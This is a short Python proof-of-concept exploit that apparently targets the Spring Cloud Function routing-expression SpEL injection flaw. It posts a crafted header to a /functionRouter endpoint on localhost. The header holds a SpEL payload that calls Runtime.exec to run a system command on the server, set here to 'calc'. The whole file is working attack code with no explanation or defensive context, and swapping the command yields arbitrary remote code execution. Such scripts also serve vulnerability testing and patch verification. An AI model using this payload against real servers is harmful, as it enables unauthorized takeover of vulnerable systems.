# coding:utf-8

import requests

url = "http://127.0.0.1:8080/functionRouter"

# 懂得都懂, test pass
cmd="calc"

payload = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'


headers = {
    'spring.cloud.function.routing-expression': payload,
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# data = 'test'
# res = requests.post(url=url,headers=headers,data=data,verify=False)
res = requests.post(url=url,headers=headers,verify=False)
print(res.status_code)
print(res.text)